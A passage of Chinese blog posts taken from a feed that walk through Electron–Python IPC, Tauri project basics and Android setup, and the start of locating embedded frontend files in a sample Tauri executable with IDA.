pythonProcess.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> errorData = data.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`错误输出: <span class="subst">$&#123;errorData&#125;</span>`</span>);</span><br><span class="line">        event.<span class="title function_">reply</span>(<span class="string">&#x27;pyexecOutput&#x27;</span>, &#123; <span class="attr">status</span>: <span class="string">&#x27;error&#x27;</span>, <span class="attr">output</span>: errorData &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    pythonProcess.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 发送剩余的数据</span></span><br><span class="line">        <span class="keyword">if</span> (outputBuffer.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            event.<span class="title function_">reply</span>(<span class="string">&#x27;pyexecOutput&#x27;</span>, &#123; <span class="attr">status</span>: <span class="string">&#x27;success&#x27;</span>, <span class="attr">output</span>: outputBuffer &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;执行完毕&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<img src="/2025/01/23/Electron/image-20250303103724641.png" alt="image-20250303103724641" style="zoom:80%;">

<p>这样输出就会变得整齐，但是有一些连续数据可能会从中间劈开，比如以下图中，六位数字可能因为数据块大小原因从中间断开</p>
<p>因此在这种方法的基础上，可以定义Python每次输出的数据量大小，然后匹配main.js每次接收的数据块的大小然后再做其他处理</p>
<img src="/2025/01/23/Electron/image-20250303103811062.png" alt="image-20250303103811062" style="zoom:50%;">

<h3 id="例子3"><a href="#例子3" class="headerlink" title="例子3"></a>例子3</h3><p>这里再给出一个简单的Electron与Python通信的示例，实现一个计算功能</p>
<img src="/2025/01/23/Electron/image-20250126185029689.png" alt="image-20250126185029689" style="zoom:60%;">

<p>首先在项目根目录下创建一个虚拟环境（名叫vvvv）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m venv vvvv</span><br></pre></td></tr></table></figure>

<p>先写一段简单的Python代码，测试一下功能，从命令行输入一个包含加法算式的字符串，然后解析并计算其中所有数字的和，并输出结果。如果输入不合法或没有输入，程序会输出相应的提示信息。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_addition</span>(<span class="params">expression</span>):</span><br><span class="line">    numbers = re.findall(<span class="string">r&#x27;\d+&#x27;</span>, expression)</span><br><span class="line">    numbers = [<span class="built_in">int</span>(num) <span class="keyword">for</span> num <span class="keyword">in</span> numbers]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(numbers)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = calculate_addition(text)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(calc(argv[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No input provided&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/23/Electron/image-20250126185415485.png" alt="image-20250126185415485"></p>
<p>渲染进程：index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Electron Python Calculator<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;expression&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter an expression (e.g., 1 + 2)&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;calculate&quot;</span>&gt;</span>Calculate<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Result: <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;result&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;renderer.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>renderer.js：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> expressInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;expression&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> calculateButton = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;calculate&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> resultSpan = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>);</span><br><span class="line"></span><br><span class="line">calculateButton.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> expression = expressInput.<span class="property">value</span>;</span><br><span class="line">    electronAPI.<span class="title function_">calculateExpression</span>(expression).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">        resultSpan.<span class="property">textContent</span> = result;</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        resultSpan.<span class="property">textContent</span> = error.<span class="property">message</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>preload.js：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; contextBridge, ipcRenderer &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>);</span><br><span class="line"></span><br><span class="line">contextBridge.<span class="title function_">exposeInMainWorld</span>(<span class="string">&#x27;electronAPI&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">calculateExpression</span>: <span class="function">(<span class="params">expression</span>) =&gt;</span> ipcRenderer.<span class="title function_">invoke</span>(<span class="string">&#x27;calculate-expression&#x27;</span>, expression)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>main.js：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;calculate-expression&#x27;</span>, <span class="keyword">async</span> (event, expression) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 指定Python解释器的路径</span></span><br><span class="line">        <span class="keyword">const</span> pythonPath = <span class="string">&#x27;.\\vvvv\\Scripts\\python.exe&#x27;</span>; <span class="comment">// 虚拟环境路径</span></span><br><span class="line">        <span class="comment">// 拼接Python脚本的路径</span></span><br><span class="line">        <span class="keyword">const</span> pythonScriptPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;calc.py&#x27;</span>);</span><br><span class="line">        <span class="comment">// 在子进程中启动Python解释器，传递表达式作为参数</span></span><br><span class="line">        <span class="keyword">const</span> python = <span class="title function_">spawn</span>(pythonPath, [pythonScriptPath, expression]);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="comment">// 监听Python子进程的标准输出</span></span><br><span class="line">        python.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">            result += data.<span class="title function_">toString</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 监听Python子进程的标准错误输出</span></span><br><span class="line">        python.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`stderr: <span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 监听Python子进程的关闭事件</span></span><br><span class="line">        python.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 根据退出码判断脚本执行是否成功，并处理Promise</span></span><br><span class="line">            <span class="keyword">if</span> (code === <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="title function_">resolve</span>(result.<span class="title function_">trim</span>());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Python script exited with code <span class="subst">$&#123;code&#125;</span>`</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/23/Electron/789456123456.gif" alt="789456123456"></p>
<h2 id="全局快捷键"><a href="#全局快捷键" class="headerlink" title="全局快捷键"></a>全局快捷键</h2><p>全局快捷键只能在主进程中调用，所以直接不用考虑渲染进程</p>
<p>main.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">on</span>(<span class="string">&#x27;ready&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> ret = globalShortcut.<span class="title function_">register</span>(<span class="string">&#x27;ctrl + q&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 按下快捷键的后续操作</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;register globalShortcut failed&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(globalShortcut.<span class="title function_">isRegistered</span>(<span class="string">&#x27;ctrl + q&#x27;</span>))</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(ret)</span><br><span class="line">    <span class="comment">// 上面这两句打印的应该是一样的布尔值</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注销快捷键</span></span><br><span class="line">app.<span class="title function_">on</span>(<span class="string">&#x27;will-quit&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    globalShortcut.<span class="title function_">unregister</span>(<span class="string">&#x27;ctrl + q&#x27;</span>) <span class="comment">// 注销某一个全局快捷键</span></span><br><span class="line">    globalShortcut.<span class="title function_">unregisterAll</span>() <span class="comment">// 注销所有快捷键</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="打包程序"><a href="#打包程序" class="headerlink" title="打包程序"></a>打包程序</h1><p>根据[官方文档](<a href="https://www.electronjs.org/zh/docs/latest/tutorial/%E6%89%93%E5%8C%85%E6%95%99%E7%A8%8B">打包您的应用程序 | Electron (electronjs.org)</a>)，使用Electron Forge</p>
<blockquote>
<p>Electron Forge 是一个处理 Electron 应用程序打包与分发的一体化工具。 在工具底层，它将许多现有的 Electron 工具 (例如 <a href="https://github.com/electron/packager"><code>@electron/packager</code></a>、 <a href="https://github.com/electron/osx-sign"><code>@electron/osx-sign</code></a>、<a href="https://github.com/electron/windows-installer"><code>electron-winstaller</code></a> 等) 组合到一起，因此您不必费心处理不同系统的打包工作。</p>
</blockquote>
<p>这里不讲细节了，只说怎么打包</p>
<p>首先</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save-dev @electron-forge/cli</span><br><span class="line">npx electron-forge import</span><br></pre></td></tr></table></figure>

<p>会有以下输出</p>
<p><img src="/2025/01/23/Electron/image-20250126210142414.png" alt="image-20250126210142414"></p>
<p>下面运行make</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm run make</span><br></pre></td></tr></table></figure>

<p>报了以下错误</p>
<p><img src="/2025/01/23/Electron/image-20250126210653162.png" alt="image-20250126210653162"></p>
<p>网络错误，应该是因为挂了小猫，检查了一下，在系统环境变量里有一个这个：</p>
<p><img src="/2025/01/23/Electron/image-20250126213349053.png" alt="image-20250126213349053"></p>
<p>把上面这一条删掉，然后重启电脑（必须重启，不重启还不行）</p>
<p>再次<code>npm run make</code></p>
<p><img src="/2025/01/23/Electron/image-20250126213501397.png" alt="image-20250126213501397"></p>
<p>这样就行了</p>
<p>但是这样打包完之后，打开安装包，程序会直接运行，然后直接安装到C盘，AppData&#x2F;Local下面，很不方便，而且安装完之后的体积非常大，基本上啥功能没写，到了450MB，以后再找找怎么优化吧。。。</p>
<br>

<br>

<br>

<p>基础的基本上就这么多东西，开发Electron应用遵循这么一个步骤就行了：先前端开发（渲染进程），渲染进程做不了的（操作关于系统的东西，需要使用Node.js）使用preload.js预加载脚本交给main.js主进程来处理就好了，毕竟主进程非常强大的</p>
<p>恭喜你学会Electron的基本操作了，现在去用vscode开发一个vscode吧！</p>
]]></content>
  </entry>
  <entry>
    <title>Tauri</title>
    <url>/2025/03/31/Tauri/</url>
    <content><![CDATA[<h1 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h1><p><strong>首先自行安装好cargo</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm create tauri-app@latest</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>然后根据提示选择项目名称、前端语言、包管理器、前端框架等，不知道怎么选的话可以按照以下方式选择：</p>
<img src="/2025/03/31/Tauri/image-20250331145720199.png" alt="image-20250331145720199" style="zoom:67%;">

<p>然后进入到刚创建的目录（目录下有package.json）中，然后执行下面三行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> tauri-app</span><br><span class="line">npm install</span><br><span class="line">npm run tauri dev</span><br></pre></td></tr></table></figure>

<p>执行完最后一行命令后，会开始<code>Downloading xx crates, remaining bytes: xxx MB</code>，会开始下载一些依赖项，时间比较长，等着就行了。执行完之后文件夹非常大，六七个G差不多，不用管，一般rust的包都很大，但是生成的exe都很小。开发完成之后直接一个<code>cargo clean</code>就都清理完了</p>
<h1 id="运行方式"><a href="#运行方式" class="headerlink" title="运行方式"></a>运行方式</h1><h2 id="主程序"><a href="#主程序" class="headerlink" title="主程序"></a>主程序</h2><p>Tauri的运行是从rust的main.rs开始执行的，如果完成了上面的所有操作，建好了一个tauri的程序，那么找到main.rs：(caj2pdf是我的程序名)</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Prevents additional console window on Windows in release, DO NOT REMOVE!!</span></span><br><span class="line"><span class="meta">#![cfg_attr(not(debug_assertions), windows_subsystem = <span class="string">&quot;windows&quot;</span>)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    caj2pdf_lib::<span class="title function_ invoke__">run</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>// Prevents additional console window on Windows in release, DO NOT REMOVE!!</code>：这是一个注释，说明了下面的<code>#![cfg_attr...]</code>指令的作用。这个指令用于在发布版本的Windows应用程序中防止额外的控制台窗口出现。在调试模式下，这个指令不会生效，所以应用程序会显示控制台窗口。</p>
</li>
<li><p><code>#![cfg_attr(not(debug_assertions), windows_subsystem = &quot;windows&quot;)]</code>：这是一个编译器指令，它告诉Rust编译器在非调试模式下（即发布模式），使用Windows子系统来运行应用程序。<code>windows_subsystem = &quot;windows&quot;</code>表示应用程序将以GUI应用程序的形式运行，而不是控制台应用程序的形式。</p>
</li>
<li><p><code>fn main() &#123; ... &#125;</code>：这是Rust程序的入口点。<code>main</code>函数是每个Rust程序必须包含的，程序从这里开始执行。</p>
</li>
<li><p><code>caj2pdf_lib::run()</code>：这是<code>main</code>函数中的实际代码，它调用了<code>caj2pdf_lib</code>模块中的<code>run</code>函数。这意味着你的Tauri应用程序的逻辑将从这个<code>run</code>函数开始执行。</p>
</li>
</ul>
<blockquote>
<p>当你运行一个Tauri应用程序时，Rust首先会从<code>main.rs</code>中的<code>main</code>函数开始执行，然后这个函数会去调用<code>caj2pdf_lib</code>模块中的<code>run</code>函数来继续执行应用程序的具体逻辑。<code>build.rs</code>文件通常用于构建脚本，在编译期间执行一些构建时任务，而<code>lib.rs</code>是库项目的主要文件，但在这个Tauri应用程序的上下文中，<code>main.rs</code>是程序运行的起点。</p>
</blockquote>
<p>至于Tauri的前端index.html和main.js等，是通过<code>tauri.conf.json</code>文件中的配置来指定的。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$schema&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://schema.tauri.app/config/2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;productName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;caj2pdf&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;identifier&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.caj2pdf.app&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;frontendDist&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../src&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;app&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;withGlobalTauri&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;windows&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;caj2pdf&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;width&quot;</span><span class="punctuation">:</span> <span class="number">800</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;height&quot;</span><span class="punctuation">:</span> <span class="number">600</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;security&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;csp&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;bundle&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;active&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;targets&quot;</span><span class="punctuation">:</span> <span class="string">&quot;all&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;icons/32x32.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;icons/128x128.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;icons/128x128@2x.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;icons/icon.icns&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;icons/icon.ico&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>可以看到有这样一个键：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;frontendDist&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../src&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这个就是前端的文件夹位置，这个文件夹里有index.html文件，程序运行时可以检索到src下面的index.html。</p>
<p>这个前端的文件貌似只能叫index.html，尝试改成其他的html名字后发现程序找不到页面，就暂时用index.jtml吧。</p>
<p>然后这个<code>tauri.conf.json</code>里面还有一些其他的配置，应该比较好懂，改图标改初始窗口大小等等。</p>
<h1 id="Tauri-基础"><a href="#Tauri-基础" class="headerlink" title="Tauri 基础"></a>Tauri 基础</h1><h2 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h2><h3 id="Frontend向Rust通信"><a href="#Frontend向Rust通信" class="headerlink" title="Frontend向Rust通信"></a>Frontend向Rust通信</h3><p>在创建项目之后的demo中，有一个<code>greet()</code>的方法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; invoke &#125; = <span class="variable language_">window</span>.<span class="property">__TAURI__</span>.<span class="property">core</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> greetInputEl;</span><br><span class="line"><span class="keyword">let</span> greetMsgEl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// Learn more about Tauri commands at https://tauri.app/develop/calling-rust/</span></span><br><span class="line">    greetMsgEl.<span class="property">textContent</span> = <span class="keyword">await</span> <span class="title function_">invoke</span>(<span class="string">&quot;greet&quot;</span>, &#123; <span class="attr">name</span>: greetInputEl.<span class="property">value</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;DOMContentLoaded&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    greetInputEl = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#greet-input&quot;</span>);</span><br><span class="line">    greetMsgEl = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#greet-msg&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#greet-form&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;submit&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        e.<span class="title function_">preventDefault</span>();</span><br><span class="line">        <span class="title function_">greet</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>首先就是要引入<code>invoke</code>，<code>const &#123; invoke &#125; = window.__TAURI__.core;</code></p>
<p>这个程序不难看出，就是获取输入框内的文字，然后点击按钮，让rust返回一句话，再显示在前端上。</p>
<p>现在单来看这个<code>greet()</code>函数：</p>
<p><img src="/2025/03/31/Tauri/image-20250331160343839.png" alt="image-20250331160343839"></p>
<p>Tauri和Electron的不同就是少了一个preload.js，感觉方便一些</p>
<p><strong>在单独的模块中调用命令</strong></p>
<p>现在，我们要把greet这个函数放到其他的rs模块中，首先创建一个command.rs</p>
<img src="/2025/03/31/Tauri/image-20250331162021439.png" alt="image-20250331162021439" style="zoom:70%;">

<p>将greet函数剪切到command.js中，给这个函数添加<code>pub</code></p>
<p><img src="/2025/03/31/Tauri/image-20250331162119161.png" alt="image-20250331162119161"></p>
<p>在<code>lib.rs</code>中引用，添加<code>mod commands;</code></p>
<p>在<code>lib.rs</code>中的invoke，修改函数</p>
<img src="/2025/03/31/Tauri/image-20250331162618647.png" alt="image-20250331162618647" style="zoom:80%;">

<p>程序仍然能正常运行</p>
<img src="/2025/03/31/Tauri/image-20250331162638538.png" alt="image-20250331162638538" style="zoom:67%;">

<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><p>使用<code>npm run tauri android dev</code>可以进行安卓的开发</p>
<p>但是我没有开发过安卓，也没有什么开发安卓的应用，如果你也是，那么第一次可能会报错如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS&gt; npm run tauri android dev</span><br><span class="line"></span><br><span class="line">&gt; swiftim@0.1.0 tauri</span><br><span class="line">&gt; tauri android dev</span><br><span class="line"></span><br><span class="line">Have you installed the Android SDK? The `ANDROID_HOME` environment variable isn&#x27;t set, and is required: environment variable not found: environment variable not found</span><br><span class="line">       Error Have you installed the Android SDK? The `ANDROID_HOME` environment variable isn&#x27;t set, and is required: environment variable not found: environment variable not found</span><br></pre></td></tr></table></figure>

<p>问题出在没有设置<code>ANDROID_HOME</code>环境变量，Tauri无法找到Android的SDK</p>
<p>因为我之前安装过 <strong>Android Studio</strong>，所以用这个来配置，没安装过的可以安装一下</p>
]]></content>
  </entry>
  <entry>
    <title>Tauri 逆向</title>
    <url>/2025/09/19/Tauri-%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<h1 id="tauri-逆向"><a href="#tauri-逆向" class="headerlink" title="tauri 逆向"></a>tauri 逆向</h1><p>本教程应该适用于Tauri v2.0以上版本，当前时间为2025.09.19，版本为：</p>
<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919140346880.png" alt="image-20250919140346880" style="zoom:50%;">

<p>其他2.0的细小版本没试过，但应该一样</p>
<span id="more"></span>

<h2 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h2><p>首先有这样一个tauri编写的exe程序</p>
<div style="display: flex; justify-content: center">
    <a href="https://creeeeeeeeeeper.github.io/2025/09/19/Tauri-%E9%80%86%E5%90%91/reverse.exe" alt="reverse.exe"><div style="display: flex; flex-direction:row; border: solid 1px #cccccc; height: 60px;">
        <image src="https://creeeeeeeeeeper.github.io/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919153217957.png" style="scale: 0.8; margin-top: 10px"></image>
        <div style="display: flex; flex-direction: column; font-size: 12.5px; padding-right: 15px; margin-top: 10px">
            <text>reverse.exe</text>
            <text style="font-size: 8px; color: #cccccc">2.11MB</text>
        </div>
    </div></a></div>

<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919094318489.png" alt="image-20250919094318489" style="zoom:50%;">

<p>运行后是这样的：</p>
<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919094400881.png" alt="image-20250919094400881" style="zoom:50%;">

<h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>首先看看输出是什么</p>
<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919094604711.png" alt="image-20250919094604711" style="zoom:50%;">

<p>直接分析不好分析，所以需要把前端的源码拿出来</p>
<p>用IDA打开</p>
<p><code>Shift + F12</code>直接搜字符串，tauri程序一般的入口都是<code>index.html</code></p>
<p>程序比较大，等IDA全都分析完之后再搜</p>
<p><img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919094937639.png" alt="image-20250919094937639"></p>
<p><img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919095005970.png" alt="image-20250919095005970"></p>
<p>搜出来了以上这些东西</p>
<p><img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919100004896.png" alt="image-20250919100004896"></p>
<p>一般来说，有一个文件名，后面是一堆十六进制看起来好像是什么内容又看起来好像被加密了的，就是资源文件内容所在的地方，如下图：</p>
<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919100132514.png" alt="image-20250919100132514" style="zoom:50%;">

<p>通过View→Open subviews→Hex dump来打开十六进制视图</p>
<p><img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919100213019.png" alt="image-20250919100213019"></p>
